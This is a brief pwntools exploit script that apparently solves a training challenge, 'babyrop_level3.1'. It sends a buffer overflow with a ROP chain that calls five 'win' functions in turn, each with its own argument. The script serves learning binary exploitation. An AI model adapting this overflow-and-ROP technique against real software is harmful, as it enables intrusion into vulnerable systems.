from pwn import *

win1 = 0x401af6
win2 = 0x401d9a
win3 = 0x401bd2
win4 = 0x401cb4
win5 = 0x401e7a
pop_rdi = 0x4020c3
r = process('/challenge/babyrop_level3.1')

payload = b'\x00'*0x38
payload +=  p64(pop_rdi) + p64(1) + p64(win1)
payload +=  p64(pop_rdi) + p64(2) + p64(win2)
payload +=  p64(pop_rdi) + p64(3) + p64(win3)
payload +=  p64(pop_rdi) + p64(4) + p64(win4)
payload +=  p64(pop_rdi) + p64(5) + p64(win5)
r.send(payload)

r.interactive()